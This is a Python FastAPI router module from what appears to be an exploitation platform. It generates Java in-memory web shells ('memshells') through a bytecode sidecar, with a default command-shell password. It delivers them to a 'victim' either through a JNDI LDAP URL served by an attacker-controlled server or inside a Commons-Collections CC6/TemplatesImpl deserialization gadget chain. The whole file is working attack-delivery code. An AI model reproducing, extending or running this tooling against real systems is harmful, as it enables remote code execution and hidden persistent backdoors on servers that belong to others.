from __future__ import annotations

import logging
from typing import Any

import httpx
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from ..auth.deps import current_user
from ..config import get_settings
from ..db import get_session
from ..models import OobToken, Project, User
from ..payloads.catalog import CATALOG_BY_ID
from ..payloads.jndi_builder import jndi_ldap_url
from ..schemas import MemshellRequest, MemshellResponse, PayloadResponse

log = logging.getLogger(__name__)
router = APIRouter(prefix="/api/memshells", tags=["memshells"])

MEMSHELL_IDS = [k for k in CATALOG_BY_ID if k.startswith("memshell_")]


@router.get("/catalog")
async def memshell_catalog(_user: User = Depends(current_user)) -> list[dict[str, Any]]:
    from ..payloads.router import _chain_out
    return [_chain_out(CATALOG_BY_ID[k]) for k in MEMSHELL_IDS]


async def _register_to_sidecar(sidecar_url: str, token: str, class_name: str, bytecode_b64: str, timeout: float) -> bool:
    """Push bytecode to sidecar RebindStore so LDAP/HTTP can serve it."""
    try:
        async with httpx.AsyncClient(timeout=timeout) as cli:
            r = await cli.post(
                f"{sidecar_url}/rebind/register",
                json={"token": token, "class_name": class_name, "bytecode_b64": bytecode_b64},
            )
        return r.status_code == 200
    except Exception as e:
        log.warning("sidecar rebind register failed: %s", e)
        return False


async def _update_token_intent(session: AsyncSession, token: str, intent: str,
                               class_name: str, bytecode_b64: str) -> None:
    """Set token intent + payload_spec so LDAP server serves the correct class."""
    res = await session.execute(select(OobToken).where(OobToken.token == token))
    tok = res.scalar_one_or_none()
    if tok:
        tok.intent = intent
        spec = dict(tok.payload_spec or {})
        spec["class_name"] = class_name
        spec["bytecode_b64"] = bytecode_b64
        tok.payload_spec = spec
        await session.commit()


@router.post("/generate", response_model=MemshellResponse)
async def generate_memshell(
    body: MemshellRequest,
    user: User = Depends(current_user),
    session: AsyncSession = Depends(get_session),
) -> MemshellResponse:
    s = get_settings()
    chain_id = f"memshell_{body.framework}_{body.type}"
    if chain_id not in CATALOG_BY_ID:
        candidates = [k for k in MEMSHELL_IDS if body.framework in k and body.type in k]
        if not candidates:
            raise HTTPException(status.HTTP_400_BAD_REQUEST,
                                f"no memshell for framework={body.framework} type={body.type}")
        chain_id = candidates[0]

    params = dict(body.params)
    params.setdefault("shell_type", "cmd")
    params.setdefault("password", "cmd")

    # Resolve token — check both body.token and params["token"]
    token = body.token or params.get("token") or ""
    deliver_via = body.deliver

    if deliver_via == "jndi_rmi":
        raise HTTPException(
            status.HTTP_501_NOT_IMPLEMENTED,
            "JNDI RMI delivery is not implemented; use jndi_ldap instead.",
        )

    # Ask sidecar for bytecode
    try:
        async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
            r = await cli.post(
                f"{s.sidecar_url}/memshell/generate",
                json={"chain": chain_id, "framework": body.framework,
                      "type": body.type, "params": params},
            )
        if r.status_code != 200:
            raise HTTPException(status.HTTP_502_BAD_GATEWAY, f"sidecar: {r.text[:200]}")
        data = r.json()
    except httpx.ConnectError:
        raise HTTPException(status.HTTP_503_SERVICE_UNAVAILABLE, "bytecode-service is not running")

    class_name = data.get("meta", {}).get("class_name") or data.get("class_name", "MemShell")
    bytecode_b64 = data.get("value") or data.get("bytecode_b64") or None
    meta = data.get("meta", {})

    # Auto-register bytecode to sidecar so LDAP/HTTP can serve it immediately
    if bytecode_b64 and token:
        registered = await _register_to_sidecar(s.sidecar_url, token, class_name, bytecode_b64, s.sidecar_timeout)
        meta["sidecar_registered"] = registered
        if registered:
            log.info("bytecode registered to sidecar for token=%s class=%s", token, class_name)

    # Build delivery payload
    delivery_payload: PayloadResponse | None = None

    if deliver_via == "jndi_ldap" and token:
        url = jndi_ldap_url(token, s, class_name)
        delivery_payload = PayloadResponse(type="jndi_ldap", content_type="text/plain", value=url)
        # Update token intent so LDAP server serves the class when victim connects
        if bytecode_b64:
            await _update_token_intent(session, token, "jndi", class_name, bytecode_b64)

    elif deliver_via == "serialize" and bytecode_b64:
        # Wrap class bytes in CC6+TemplatesImpl gadget chain via sidecar.
        # Uses BytecodeSerializeHandler (pure in-process, no ysoserial subprocess).
        # Works on targets with commons-collections 3.x; memshell class is loaded
        # via a generated AbstractTranslet wrapper with a custom ClassLoader.
        try:
            async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
                r2 = await cli.post(
                    f"{s.sidecar_url}/generate",
                    json={"chain": "serialize_bytecode_cc6", "params": {"bytecode_b64": bytecode_b64}},
                )
            if r2.status_code == 200:
                d2 = r2.json()
                delivery_payload = PayloadResponse(
                    type="serialize_cc6_bytecode",
                    content_type=d2.get("content_type", "application/octet-stream"),
                    value=d2.get("value", ""),
                )
        except httpx.ConnectError:
            pass

    return MemshellResponse(
        framework=body.framework,
        type=body.type,
        class_name=class_name,
        bytecode_b64=bytecode_b64,
        payload=delivery_payload,
        meta=meta,
    )
